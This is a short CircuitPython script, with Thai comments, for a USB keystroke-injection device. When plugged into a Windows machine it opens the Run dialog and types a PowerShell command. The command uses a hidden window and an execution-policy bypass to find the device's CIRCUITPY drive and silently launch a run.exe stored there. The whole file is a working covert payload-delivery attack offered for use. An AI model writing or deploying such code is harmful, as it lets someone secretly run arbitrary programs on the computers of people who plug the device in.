import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# รอให้ระบบ Windows พร้อม (เซฟสำหรับเครื่องช้า)
time.sleep(3.5)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def type_and_enter(text, delay=0.5):
    layout.write(text)
    time.sleep(delay)
    kbd.send(Keycode.ENTER)
    time.sleep(0.6)

# เปิด Run
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.2)

cmd = (
    'powershell -w h -ep bypass -c '
    '"$d=(gwmi win32_volume -f \'Label=\\\'CIRCUITPY\\\'\').Name;'
    'if($d){Start-Process ($d+\'run.exe\') -WindowStyle Hidden}"'
)

type_and_enter(cmd)

# กันไม่ให้โค้ดจบ
while True:
    time.sleep(3600)
